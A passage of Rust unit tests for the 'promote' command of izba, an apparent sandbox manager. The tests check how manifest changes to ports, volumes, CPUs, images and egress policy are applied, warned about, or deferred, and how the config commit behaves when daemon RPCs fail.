        seed_cached_image(&paths, "testimg");

        let mut client = fake_daemon(|mut s| {
            expect_inspect_reply(&mut s, "web", "running");
            expect_and_ok(
                &mut s,
                |r| matches!(r, DaemonRequest::ReloadPolicy { name } if name == "web"),
                "ReloadPolicy",
            );
        });
        let mut events: Vec<PromoteEvent> = Vec::new();
        let mut on_event = |e: PromoteEvent| events.push(e);
        let outcome = run_with_client(
            &paths,
            &repo_dir,
            "web",
            opts(false, false, true),
            &mut on_event,
            &mut no_build,
            &mut client,
        )
        .unwrap();

        assert_eq!(outcome.applied.len(), 1);
        assert_eq!(outcome.applied[0].field, "egress");
        assert!(outcome.applied[0].weakens_egress);
        assert!(!outcome.needs_restart);
        assert!(!outcome.restarted);
        assert!(!outcome.stopped);
        assert_eq!(
            outcome.warnings,
            vec!["WARNING: weakens egress: egress".to_string()]
        );
        assert_eq!(events.len(), 2);
        assert!(matches!(&events[0], PromoteEvent::Warn(m) if m.contains("weakens egress")));
        assert!(matches!(&events[1], PromoteEvent::Info(m) if m == "promoted web"));
    }

    /// A STOPPED sandbox: live RPCs are skipped entirely (only `Inspect` is
    /// sent), `stopped` is reported, and the pending delta warns "changes
    /// apply on next start" rather than trying to reach a dead guest.
    #[test]
    fn run_with_client_stopped_sandbox_defers_changes_to_next_start() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        let yaml = manifest_yaml(
            "testimg",
            2,
            "  ports:\n    - { guest: 81, host: 3333, bind: 127.0.0.1 }\n",
        );
        std::fs::write(repo_dir.join("izba.yml"), &yaml).unwrap();
        let sandbox_dir = seed_managed(
            &paths,
            "web",
            "testimg",
            2,
            vec![PortRule {
                bind: "127.0.0.1".parse().unwrap(),
                host_port: 2222,
                guest_port: 80,
            }],
            vec![],
            None,
        );
        let token = store::review_token(&yaml, None);
        store::write_review(&sandbox_dir, &token).unwrap();
        seed_cached_image(&paths, "testimg");

        let mut client = fake_daemon(|mut s| {
            expect_inspect_reply(&mut s, "web", "stopped");
        });
        let mut events: Vec<PromoteEvent> = Vec::new();
        let mut on_event = |e: PromoteEvent| events.push(e);
        let outcome = run_with_client(
            &paths,
            &repo_dir,
            "web",
            opts(false, false, true),
            &mut on_event,
            &mut no_build,
            &mut client,
        )
        .unwrap();

        assert_eq!(
            outcome.applied.len(),
            1,
            "the ports delta is still recorded"
        );
        assert_eq!(outcome.applied[0].field, "ports");
        assert!(outcome.stopped);
        assert!(!outcome.needs_restart);
        assert_eq!(
            outcome.warnings,
            vec!["sandbox not running — changes apply on next start".to_string()]
        );
        assert_eq!(events.len(), 2);
        assert!(matches!(&events[0], PromoteEvent::Warn(m) if m.contains("not running")));
    }

    /// A STOPPED sandbox with `--restart` AND a pending restart-class delta:
    /// `will_start` must suppress the "not running" warning (it's about to
    /// Start anyway) and the restart dance must skip `Stop` (nothing is
    /// running to stop) but still send `Start`. Distinguishes this from
    /// `run_with_client_stopped_sandbox_defers_changes_to_next_start`, where
    /// `restart` is false and the right-hand side of `will_start`'s `&&`
    /// (`!p.restart_fields.is_empty()`) is never actually exercised.
    #[test]
    fn run_with_client_restart_flag_starts_a_stopped_sandbox_without_stop() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        let yaml = manifest_yaml("testimg", 4, "");
        std::fs::write(repo_dir.join("izba.yml"), &yaml).unwrap();
        let sandbox_dir = seed_managed(&paths, "web", "testimg", 2, vec![], vec![], None);
        let token = store::review_token(&yaml, None);
        store::write_review(&sandbox_dir, &token).unwrap();
        seed_cached_image(&paths, "testimg");

        let mut client = fake_daemon(|mut s| {
            expect_inspect_reply(&mut s, "web", "stopped");
            // No Stop expected — the sandbox was never running.
            expect_and_ok(
                &mut s,
                |r| matches!(r, DaemonRequest::Start { name, .. } if name == "web"),
                "Start",
            );
        });
        let mut events: Vec<PromoteEvent> = Vec::new();
        let mut on_event = |e: PromoteEvent| events.push(e);
        let outcome = run_with_client(
            &paths,
            &repo_dir,
            "web",
            opts(false, true, true), // restart: true
            &mut on_event,
            &mut no_build,
            &mut client,
        )
        .unwrap();

        assert_eq!(outcome.applied[0].field, "cpus");
        assert!(outcome.stopped, "was stopped at the start");
        assert!(outcome.restarted);
        assert!(!outcome.needs_restart);
        assert!(
            outcome.warnings.is_empty(),
            "will_start must suppress the 'not running' warning"
        );
        assert!(
            matches!(&events[0], PromoteEvent::Info(m) if m.starts_with("restarted to apply: cpus")),
            "no Warn event should precede it either"
        );
    }

    /// A restart-class delta (cpus) WITHOUT `--restart`: nothing is applied
    /// live, `needs_restart` is reported, and the CLI-facing message is an
    /// `Info` (not a `Warn`) pointing at `izba promote --restart`.
    #[test]
    fn run_with_client_restart_class_delta_without_restart_flag_needs_restart() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        let yaml = manifest_yaml("testimg", 4, "");
        std::fs::write(repo_dir.join("izba.yml"), &yaml).unwrap();
        let sandbox_dir = seed_managed(&paths, "web", "testimg", 2, vec![], vec![], None);
        let token = store::review_token(&yaml, None);
        store::write_review(&sandbox_dir, &token).unwrap();
        seed_cached_image(&paths, "testimg");

        let mut client = fake_daemon(|mut s| {
            expect_inspect_reply(&mut s, "web", "running");
        });
        let mut events: Vec<PromoteEvent> = Vec::new();
        let mut on_event = |e: PromoteEvent| events.push(e);
        let outcome = run_with_client(
            &paths,
            &repo_dir,
            "web",
            opts(false, false, true), // restart: false
            &mut on_event,
            &mut no_build,
            &mut client,
        )
        .unwrap();

        assert_eq!(outcome.applied[0].field, "cpus");
        assert!(outcome.needs_restart, "restart-class delta must be flagged");
        assert!(!outcome.restarted);
        assert!(!outcome.stopped);
        assert!(outcome.warnings.is_empty(), "a plain cpu bump never warns");
        assert_eq!(events.len(), 2);
        assert!(
            matches!(&events[0], PromoteEvent::Info(m) if m.starts_with("pending restart to apply: cpus"))
        );
    }

    /// Port AND volume deltas on a RUNNING sandbox drive the full RPC
    /// sequence in order: `PortUnpublish` -> `PortPublish` -> `VolumeDetach`
    /// -> `VolumeAttach` (mirrors `apply::plan`'s field order).
    #[test]
    fn run_with_client_applies_port_and_volume_deltas_when_running() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        let yaml = manifest_yaml(
            "testimg",
            2,
            "  ports:\n    - { guest: 81, host: 3333, bind: 127.0.0.1 }\n  volumes:\n    - { name: d2, mountPath: /new, size: 1Gi }\n",
        );
        std::fs::write(repo_dir.join("izba.yml"), &yaml).unwrap();
        let sandbox_dir = seed_managed(
            &paths,
            "web",
            "testimg",
            2,
            vec![PortRule {
                bind: "127.0.0.1".parse().unwrap(),
                host_port: 2222,
                guest_port: 80,
            }],
            vec![VolumeSpec {
                name: Some("d".into()),
                guest_path: "/old".into(),
                size_bytes: 1 << 30,
                eph_id: None,
            }],
            None,
        );
        let token = store::review_token(&yaml, None);
        store::write_review(&sandbox_dir, &token).unwrap();
        seed_cached_image(&paths, "testimg");

        let mut client = fake_daemon(|mut s| {
            expect_inspect_reply(&mut s, "web", "running");
            expect_and_ok(
                &mut s,
                |r| {
                    matches!(r, DaemonRequest::PortUnpublish { name, host_port, .. }
                        if name == "web" && *host_port == 2222)
                },
                "PortUnpublish",
            );
            expect_and_ok(
                &mut s,
                |r| {
                    matches!(r, DaemonRequest::PortPublish { name, rule, persist }
                        if name == "web" && rule.host_port == 3333 && *persist)
                },
                "PortPublish",
            );
            expect_and_ok(
                &mut s,
                |r| {
                    matches!(r, DaemonRequest::VolumeDetach { name, guest_path }
                        if name == "web" && guest_path == std::path::Path::new("/old"))
                },
                "VolumeDetach",
            );
            expect_and_ok(
                &mut s,
                |r| {
                    matches!(r, DaemonRequest::VolumeAttach { name, spec }
                        if name == "web" && spec.guest_path == std::path::Path::new("/new"))
                },
                "VolumeAttach",
            );
        });
        let mut events: Vec<PromoteEvent> = Vec::new();
        let mut on_event = |e: PromoteEvent| events.push(e);
        let outcome = run_with_client(
            &paths,
            &repo_dir,
            "web",
            opts(false, false, true),
            &mut on_event,
            &mut no_build,
            &mut client,
        )
        .unwrap();

        let fields: Vec<&str> = outcome.applied.iter().map(|d| d.field.as_str()).collect();
        assert!(fields.contains(&"ports"));
        assert!(fields.contains(&"volumes"));
        assert!(!outcome.needs_restart);
        assert!(!outcome.stopped);
        assert!(outcome.warnings.is_empty());
    }

    /// An image change WITHOUT `--restart` must bail (Fix 2) before ever
    /// touching the daemon or resolving the new digest — a promoted
    /// config.json pointing at a new image with the OLD rw overlay could be
    /// unbootable.
    #[test]
    fn run_with_client_bails_on_image_change_without_restart() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        let yaml = manifest_yaml("newimg", 2, "");
        std::fs::write(repo_dir.join("izba.yml"), &yaml).unwrap();
        let sandbox_dir = seed_managed(&paths, "web", "testimg", 2, vec![], vec![], None);
        let token = store::review_token(&yaml, None);
        store::write_review(&sandbox_dir, &token).unwrap();
        // Deliberately do NOT seed a cached "newimg" tag: a correct
        // implementation must bail before ever resolving it.

        let mut client = idle_daemon();
        let mut events: Vec<PromoteEvent> = Vec::new();
        let mut on_event = |e: PromoteEvent| events.push(e);
        let err = run_with_client(
            &paths,
            &repo_dir,
            "web",
            opts(false, false, true), // restart: false
            &mut on_event,
            &mut no_build,
            &mut client,
        )
        .unwrap_err();
        assert!(err.to_string().contains("--restart"), "{err}");
    }

    /// `--restart` on an image-change delta drives the full Stop -> Start
    /// dance (skipping `reset_rw_scratch` here via `reset_scratch: false`,
    /// which also exercises the "keeps the old overlay" expert warning).
    /// `state.json` is seeded with a DEGRADED (unconfined) confinement status
    /// so `allow_unconfined` is actually computed through the `!c.is_confined()`
    /// mapping (a None `RunState` — the untested-elsewhere default — would
    /// short-circuit to `false` regardless, masking that line).
    #[test]
    fn run_with_client_restart_flag_drives_stop_start_dance_and_expert_warning() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        let yaml = manifest_yaml("newimg", 2, "");
        std::fs::write(repo_dir.join("izba.yml"), &yaml).unwrap();
        let sandbox_dir = seed_managed(&paths, "web", "testimg", 2, vec![], vec![], None);
        let token = store::review_token(&yaml, None);
        store::write_review(&sandbox_dir, &token).unwrap();
        seed_cached_image(&paths, "newimg");
        // Degraded (unconfined) confinement -> is_confined() == false ->
        // allow_unconfined must come out TRUE on the Start that follows.
        let run_state = RunState {
            vmm_pid: crate::state::PidIdentity {
                pid: 1,
                starttime: 1,
            },
            sidecar_pids: vec![],
            started_unix_ms: 0,
            confinement: Some(crate::procmgr::ConfinementStatus::degraded("test")),
        };
        save_json(&sandbox_dir.join(STATE_FILE), &run_state).unwrap();

        let mut client = fake_daemon(|mut s| {
            expect_inspect_reply(&mut s, "web", "running");
            expect_and_ok(
                &mut s,
                |r| matches!(r, DaemonRequest::Stop { name } if name == "web"),
                "Stop",
            );
            expect_and_ok(
                &mut s,
                |r| matches!(r, DaemonRequest::Start { name, allow_unconfined } if name == "web" && *allow_unconfined),
                "Start",
            );
        });
        let mut events: Vec<PromoteEvent> = Vec::new();
        let mut on_event = |e: PromoteEvent| events.push(e);
        let outcome = run_with_client(
            &paths,
            &repo_dir,
            "web",
            opts(false, true, false), // restart: true, reset_scratch: false
            &mut on_event,
            &mut no_build,
            &mut client,
        )
        .unwrap();

        assert_eq!(outcome.applied[0].field, "image");
        assert!(outcome.restarted);
        assert!(
            !outcome.needs_restart,
            "restarted this run, nothing pending"
        );
        assert!(!outcome.stopped, "was running at the start");
        assert_eq!(
            outcome.warnings,
            vec![
                "WARNING: --reset-scratch=false keeps the rw overlay built on the PREVIOUS image. \
                 Packages installed (e.g. apt-get) against the old base may have missing libs / \
                 wrong ABI on the new image and can render the guest UNBOOTABLE. Proceed only if \
                 you understand overlay semantics."
                    .to_string()
            ]
        );
        assert_eq!(
            events.len(),
            3,
            "expert warning + restarted info + promoted info"
        );
        assert!(matches!(&events[0], PromoteEvent::Warn(_)));
        assert!(
            matches!(&events[1], PromoteEvent::Info(m) if m.starts_with("restarted to apply: image"))
        );
        assert!(matches!(&events[2], PromoteEvent::Info(m) if m == "promoted web"));
    }

    /// `--restart` WITH `reset_scratch: true` (the common case): the expert
    /// "keeps the old overlay" warning must NOT fire, and `reset_rw_scratch`
    /// actually runs against a real `rw.img` on disk. Distinguishes `if
    /// p.image_changed && !reset_scratch` from a `&&`->`||` mutation, which
    /// the `reset_scratch: false` sibling test above cannot: there,
    /// `!reset_scratch` is already `true`, so `image_changed || true` and
    /// `image_changed && true` agree.
    #[test]
    fn run_with_client_restart_with_reset_scratch_true_skips_expert_warning() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        let yaml = manifest_yaml("newimg", 2, "");
        std::fs::write(repo_dir.join("izba.yml"), &yaml).unwrap();
        let sandbox_dir = seed_managed(&paths, "web", "testimg", 2, vec![], vec![], None);
        let token = store::review_token(&yaml, None);
        store::write_review(&sandbox_dir, &token).unwrap();
        seed_cached_image(&paths, "newimg");
        // reset_rw_scratch needs a real rw.img to read the size of and
        // recreate blank; a small sparse file keeps mkfs.ext4 fast.
        let rw = sandbox_dir.join("rw.img");
        let f = std::fs::File::create(&rw).unwrap();
        f.set_len(64 << 20).unwrap();
        drop(f);

        let mut client = fake_daemon(|mut s| {
            expect_inspect_reply(&mut s, "web", "running");
            expect_and_ok(
                &mut s,
                |r| matches!(r, DaemonRequest::Stop { name } if name == "web"),
                "Stop",
            );
            expect_and_ok(
                &mut s,
                |r| matches!(r, DaemonRequest::Start { name, .. } if name == "web"),
                "Start",
            );
        });
        let mut events: Vec<PromoteEvent> = Vec::new();
        let mut on_event = |e: PromoteEvent| events.push(e);
        let outcome = run_with_client(
            &paths,
            &repo_dir,
            "web",
            opts(false, true, true), // restart: true, reset_scratch: true
            &mut on_event,
            &mut no_build,
            &mut client,
        )
        .unwrap();

        assert!(outcome.restarted);
        assert!(
            outcome.warnings.is_empty(),
            "reset_scratch: true must NOT trigger the 'keeps old overlay' warning"
        );
        assert!(rw.is_file(), "rw.img must still exist after the reset");
        assert_eq!(
            events.len(),
            2,
            "restarted info + promoted info, no expert warning"
        );
        assert!(
            matches!(&events[0], PromoteEvent::Info(m) if m.starts_with("restarted to apply: image"))
        );
    }

    /// A STOPPED sandbox with `--restart` but NO restart-class delta at all
    /// (only a Live-class ports change): the restart block never runs
    /// (`p.restart_fields` is empty), so `--restart` doesn't actually start
    /// anything — the "not running" warning must still fire. Distinguishes
    /// `will_start = restart && !p.restart_fields.is_empty()` from a
    /// `&&`->`||` mutation, which
    /// `run_with_client_restart_flag_starts_a_stopped_sandbox_without_stop`
    /// cannot: there `!p.restart_fields.is_empty()` is already `true`, so
    /// `restart || true` and `restart && true` agree.
    #[test]
    fn run_with_client_restart_flag_stopped_with_no_restart_delta_still_warns() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        let yaml = manifest_yaml(
            "testimg",
            2,
            "  ports:\n    - { guest: 81, host: 3333, bind: 127.0.0.1 }\n",
        );
        std::fs::write(repo_dir.join("izba.yml"), &yaml).unwrap();
        let sandbox_dir = seed_managed(&paths, "web", "testimg", 2, vec![], vec![], None);
        let token = store::review_token(&yaml, None);
        store::write_review(&sandbox_dir, &token).unwrap();
        seed_cached_image(&paths, "testimg");

        let mut client = fake_daemon(|mut s| {
            expect_inspect_reply(&mut s, "web", "stopped");
            // No further RPC: nothing restart-class to apply, live RPCs are
            // skipped because the sandbox isn't running.
        });
        let mut events: Vec<PromoteEvent> = Vec::new();
        let mut on_event = |e: PromoteEvent| events.push(e);
        let outcome = run_with_client(
            &paths,
            &repo_dir,
            "web",
            opts(false, true, true), // restart: true, but nothing restart-class pending
            &mut on_event,
            &mut no_build,
            &mut client,
        )
        .unwrap();

        assert!(outcome.stopped);
        assert!(!outcome.restarted, "nothing restart-class to apply");
        assert_eq!(
            outcome.warnings,
            vec!["sandbox not running — changes apply on next start".to_string()],
            "--restart alone must not silence the warning when there's nothing to restart"
        );
        assert!(matches!(&events[0], PromoteEvent::Warn(m) if m.contains("not running")));
    }

    /// #131: a Start failure during the restart leg must NOT leave the drift
    /// bookkeeping diverged — the commit unit (config.json, manifest.base.yaml,
    /// and the consumed review token) lands before the lifecycle leg, so
    /// afterwards `izba diff` reports in-sync and `izba start` is the whole
    /// recovery.
    #[test]
    fn run_with_client_start_failure_still_advances_base() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        let yaml = manifest_yaml("newimg", 2, "");
        std::fs::write(repo_dir.join("izba.yml"), &yaml).unwrap();
        let sandbox_dir = seed_managed(&paths, "web", "testimg", 2, vec![], vec![], None);
        let token = store::review_token(&yaml, None);
        store::write_review(&sandbox_dir, &token).unwrap();
        seed_cached_image(&paths, "newimg");
        // Give reset_rw_scratch a real rw.img (reset_scratch: true path).
        let f = std::fs::File::create(sandbox_dir.join("rw.img")).unwrap();
        f.set_len(64 << 20).unwrap();
        drop(f);

        let mut client = fake_daemon(|mut s| {
            expect_inspect_reply(&mut s, "web", "running");
            expect_and_ok(
                &mut s,
                |r| matches!(r, DaemonRequest::Stop { name } if name == "web"),
                "Stop",
            );
            expect_and_error(
                &mut s,
                |r| matches!(r, DaemonRequest::Start { name, .. } if name == "web"),
                "Start",
                "vmm exploded",
            );
        });
        let mut events: Vec<PromoteEvent> = Vec::new();
        let mut on_event = |e: PromoteEvent| events.push(e);
        let err = run_with_client(
            &paths,
            &repo_dir,
            "web",
            opts(false, true, true),
            &mut on_event,
            &mut no_build,
            &mut client,
        )
        .unwrap_err();

        let msg = err.to_string();
        assert!(msg.contains("config already committed"), "{msg}");
        assert!(msg.contains("izba start web"), "{msg}");
        // The commit unit landed: base == repo manifest, token consumed.
        let base = store::read_base(&sandbox_dir)
            .unwrap()
            .expect("base written");
        let base_n = Normalized::from_manifest(&base, "web").unwrap();
        let repo_n =
            Normalized::from_manifest(&ops::load_repo_manifest(&repo_dir).unwrap().0, "web")
                .unwrap();
        assert_eq!(base_n, repo_n, "base must record the promoted manifest");
        assert!(store::read_review(&sandbox_dir).unwrap().is_none());
        // Drift is in-sync, not diverged: managed was written before the leg.
        let managed = ops::managed_normalized(&paths, "web").unwrap();
        assert_eq!(
            crate::manifest::classify(&base_n, &repo_n, &managed),
            DriftState::InSync
        );
    }

    /// #131 (Stop leg): a Stop failure equally lands the commit unit first,
    /// with an error saying the promote itself is committed.
    #[test]
    fn run_with_client_stop_failure_still_advances_base() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        let yaml = manifest_yaml("newimg", 2, "");
        std::fs::write(repo_dir.join("izba.yml"), &yaml).unwrap();
        let sandbox_dir = seed_managed(&paths, "web", "testimg", 2, vec![], vec![], None);
        let token = store::review_token(&yaml, None);
        store::write_review(&sandbox_dir, &token).unwrap();
        seed_cached_image(&paths, "newimg");

        let mut client = fake_daemon(|mut s| {
            expect_inspect_reply(&mut s, "web", "running");
            expect_and_error(
                &mut s,
                |r| matches!(r, DaemonRequest::Stop { name } if name == "web"),
                "Stop",
                "stop refused",
            );
        });
        let mut events: Vec<PromoteEvent> = Vec::new();
        let mut on_event = |e: PromoteEvent| events.push(e);
        let err = run_with_client(
            &paths,
            &repo_dir,
            "web",
            opts(false, true, true),
            &mut on_event,
            &mut no_build,
            &mut client,
        )
        .unwrap_err();

        let msg = err.to_string();
        assert!(msg.contains("the promote itself is committed"), "{msg}");
        let base = store::read_base(&sandbox_dir)
            .unwrap()
            .expect("base written");
        let base_n = Normalized::from_manifest(&base, "web").unwrap();
        assert_eq!(
            base_n.image,
            ImageSource::Ref("newimg".into()),
            "base must record the promoted manifest"
        );
        assert!(store::read_review(&sandbox_dir).unwrap().is_none());
    }

    /// #131 UPPER-BOUND pin: on a RUNNING sandbox, a failing *live* RPC (here
    /// `ReloadPolicy`) must leave the WHOLE commit unit unwritten — not just
    /// `manifest.base.yaml`/the review token, but `config.json` itself, which
    /// only `apply::write_managed` ever touches and which sits strictly AFTER
    /// the live-RPC block. This is the mirror image of
    /// `run_with_client_start_failure_still_advances_base` /
    /// `run_with_client_stop_failure_still_advances_base` (which pin the
    /// LOWER bound: lifecycle-leg failures must NOT prevent the commit): this
    /// test pins the UPPER bound, so a future hoist of
    /// `write_base`/`clear_review` (or `write_managed`) above the live-RPC
    /// block can't pass silently — it would leave this test observing a
    /// committed `config.json` despite the RPC still failing.
    ///
    /// Note: `policy.yaml` is a deliberate, documented exception (see the
    /// "policy.yaml is the one durable file that must land BEFORE its live
    /// RPC" comment above) — it is written before `ReloadPolicy` because the
    /// RPC re-reads it from disk, and `write_managed` re-writes it identically
    /// on success. So this test does not assert policy.yaml is unchanged; it
    /// pins `config.json`'s `image_digest`, which is untouched until
    /// `write_managed` runs.
    #[test]
    fn run_with_client_live_rpc_failure_leaves_commit_unit_unwritten() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        let yaml = manifest_yaml(
            "testimg",
            2,
            "  egress:\n    enforce: true\n    allow: [github.com]\n",
        );
        std::fs::write(repo_dir.join("izba.yml"), &yaml).unwrap();
        let sandbox_dir = seed_managed(
            &paths,
            "web",
            "testimg",
            2,
            vec![],
            vec![],
            Some(EgressPolicyConfig {
                enforce: true,
                allow: vec![],
                git: vec![],
            }),
        );
        let token = store::review_token(&yaml, None);
        store::write_review(&sandbox_dir, &token).unwrap();
        seed_cached_image(&paths, "testimg");

        let mut client = fake_daemon(|mut s| {
            expect_inspect_reply(&mut s, "web", "running");
            expect_and_error(
                &mut s,
                |r| matches!(r, DaemonRequest::ReloadPolicy { name } if name == "web"),
                "ReloadPolicy",
                "policy reload refused",
            );
        });
        let mut events: Vec<PromoteEvent> = Vec::new();
        let mut on_event = |e: PromoteEvent| events.push(e);
        let err = run_with_client(
            &paths,
            &repo_dir,
            "web",
            opts(false, false, true),
            &mut on_event,
            &mut no_build,
            &mut client,
        )
        .unwrap_err();

        assert!(err.to_string().contains("policy reload refused"), "{err}");

        // The commit unit never landed: base absent, review token intact.
        assert!(
            store::read_base(&sandbox_dir).unwrap().is_none(),
            "base must NOT advance while a live RPC is still failing"
        );
        assert!(
            store::read_review(&sandbox_dir).unwrap().is_some(),
            "the review token must survive a failed live RPC"
        );
        // config.json itself was never rewritten: `write_managed` sits
        // strictly AFTER the live-RPC block, so the seeded placeholder digest
        // must survive untouched.
        let cfg: SandboxConfig = load_json(&sandbox_dir.join(CONFIG_FILE))
            .unwrap()
            .expect("config.json still present");
        assert_eq!(
            cfg.image_digest, "sha256:existing",
            "config.json must not be committed while a live RPC is still failing"
        );
    }

    /// (Final-review finding, minor) `reset_rw_scratch` failing must give an
    /// HONEST recovery hint: the config is already committed, the OLD scratch
    /// overlay was KEPT (the reset is atomic — tmp+rename — so a failure
    /// never touches the surviving old file), and a plain `izba start` would
    /// boot the NEW image over that OLD (mismatched) overlay — which may
    /// misbehave or fail to boot, not a safe blind retry. Hermetic: an absent
    /// `rw.img` makes `reset_rw_scratch` fail deterministically at its very
    /// first step (reading the file's size) — no need to fake a mid-write I/O
    /// error — so `Start` is never even sent.
    #[test]
    fn run_with_client_scratch_reset_failure_gives_honest_recovery_hint() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        let yaml = manifest_yaml("newimg", 2, "");
        std::fs::write(repo_dir.join("izba.yml"), &yaml).unwrap();
        let sandbox_dir = seed_managed(&paths, "web", "testimg", 2, vec![], vec![], None);
        let token = store::review_token(&yaml, None);
        store::write_review(&sandbox_dir, &token).unwrap();
        seed_cached_image(&paths, "newimg");
        // Deliberately do NOT seed rw.img: reset_rw_scratch's first step
        // (reading its size) fails deterministically and hermetically.

        let mut client = fake_daemon(|mut s| {
            expect_inspect_reply(&mut s, "web", "running");
            expect_and_ok(
                &mut s,
                |r| matches!(r, DaemonRequest::Stop { name } if name == "web"),
                "Stop",
            );
            // No Start expected: reset_rw_scratch fails before Start is sent.
        });
        let mut events: Vec<PromoteEvent> = Vec::new();
        let mut on_event = |e: PromoteEvent| events.push(e);
        let err = run_with_client(
            &paths,
            &repo_dir,
            "web",
            opts(false, true, true), // restart: true, reset_scratch: true
            &mut on_event,
            &mut no_build,
            &mut client,
        )
        .unwrap_err();

        let msg = err.to_string();
        assert!(msg.contains("config already committed"), "{msg}");
        assert!(msg.contains("OLD scratch overlay was kept"), "{msg}");
        assert!(msg.contains("izba start web"), "{msg}");
        // The restart-leg failure must not un-commit the promote itself.
        assert!(
            store::read_base(&sandbox_dir).unwrap().is_some(),
            "base must still advance despite the restart-leg failure"
        );
        assert!(store::read_review(&sandbox_dir).unwrap().is_none());
    }
}
